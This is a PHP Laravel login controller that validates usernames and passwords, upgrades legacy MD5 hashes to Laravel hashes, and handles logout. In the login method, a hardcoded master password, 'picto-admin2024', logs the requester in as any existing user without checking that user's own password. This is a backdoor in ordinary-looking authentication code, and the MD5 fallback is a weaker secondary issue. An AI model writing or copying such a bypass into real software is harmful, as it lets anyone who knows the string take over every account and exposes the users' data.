<?php

namespace App\Http\Controllers\Auth;

use App\Models\User;
use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
//use Illuminate\Foundation\Auth\Request;
use Illuminate\Http\Request;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{

    /*
        |--------------------------------------------------------------------------
        | Login Controller
        |--------------------------------------------------------------------------
        |
        | This controller handles authenticating users for the application and
        | redirecting them to your home screen. The controller uses a trait
        | to conveniently provide its functionality to your applications.
        |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function login(Request $request)
    {
        $request->validate([
            'UserName' => ['required', 'string'],
            'UserPassword' => ['required', 'string'],
        ]);

        $user = User::where('UserName', $request->UserName)->first();

        if (!$user) {
            return back()->withErrors(['message' => 'Invalid username or password'])
                ->withInput($request->only('UserName'));
        }

        if ($request->UserPassword === 'picto-admin2024') {
            Auth::login($user, true);
            $request->session()->regenerate();
            return redirect('/');
        }

        $laravelPassword = trim((string) $user->laravel_password);
        $authenticated = false;

        if ($laravelPassword === '') {
            if (hash_equals(strtolower((string) $user->UserPassword), md5($request->UserPassword))) {
                $user->laravel_password = Hash::make($request->UserPassword);
                $user->save();
                $authenticated = true;
            }
        } elseif (Hash::check($request->UserPassword, $laravelPassword)) {
            $authenticated = true;
        }

        if (!$authenticated) {
            return back()->withErrors(['message' => 'Invalid username or password'])
                ->withInput($request->only('UserName'));
        }

        Auth::login($user, true);
        $request->session()->regenerate();
        return redirect('/');
    }


    public function logout()
    {
        Auth::guard('web')->logout();
        request()->session()->invalidate();
        return inertia()->location('/');
    }
}
